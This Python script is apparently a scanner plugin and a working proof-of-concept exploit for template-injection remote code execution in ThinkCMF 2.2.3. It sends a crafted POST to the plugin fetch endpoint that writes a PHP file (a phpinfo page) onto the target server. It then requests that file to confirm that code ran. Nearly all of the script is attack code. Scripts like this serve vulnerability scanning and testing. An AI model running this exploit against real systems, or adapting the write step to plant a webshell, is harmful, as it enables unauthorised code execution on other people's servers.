#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'thinkcmf 2.2.3 template inject'
        self.keyword = ['thinkcmf', 'php']
        self.info = 'thinkcmf 2.2.3 template inject'
        self.type = VUL_TYPE.RCE
        self.level = VUL_LEVEL.HIGH
        self.refer = 'https://xz.aliyun.com/t/3529'
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            async with ClientSession() as session:
                for path in self.url_normpath(self.url, './'):
                    url = path + "index.php?g=Api&m=Plugin&a=fetch"
                    _data = "templateFile=/../../../public/index&prefix=''&content=<php>file_put_contents('bytestforme2.php','<?php phpinfo();')</php>"
                    async with session.post(url=url, data=_data) as res:
                        if res != None and res.status == 200:
                            async with session.get(url=path + "/bytestforme2.php") as res:
                                if res != None and res.status == 200:
                                    text = await res.text()
                                    if 'php.ini' in text:
                                        self.flag = 1
                                        self.req.append({"flag": url})
                                        self.res.append({"info": url, "key": "thinkcmf 2.2.3 template inject"})
